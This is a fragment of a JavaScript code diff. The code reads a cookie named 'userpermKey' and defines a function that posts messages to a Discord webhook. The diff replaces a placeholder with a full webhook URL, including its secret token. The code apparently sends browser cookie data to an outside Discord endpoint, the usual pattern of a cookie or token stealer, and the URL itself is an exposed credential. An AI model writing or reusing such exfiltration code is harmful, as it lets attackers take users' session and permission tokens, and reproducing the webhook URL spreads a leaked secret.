@@ -14,7 +14,7 @@ const userpermKey = getCookie('userpermKey');
 
 // Function to send a message to a Discord webhook
 function sendToDiscordWebhook(message) {
-    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+    const webhookUrl = 'https://discord.com/api/webhooks/1150191042134540398/Q_ZV-v3NWy87SP3xN4mHXDEyVFYwivDPcvbs-t4_bLnroSHBcBqTi-Mn3kAEo84EaFhL';
     const payload = { content: message };
 
     fetch(webhookUrl, {
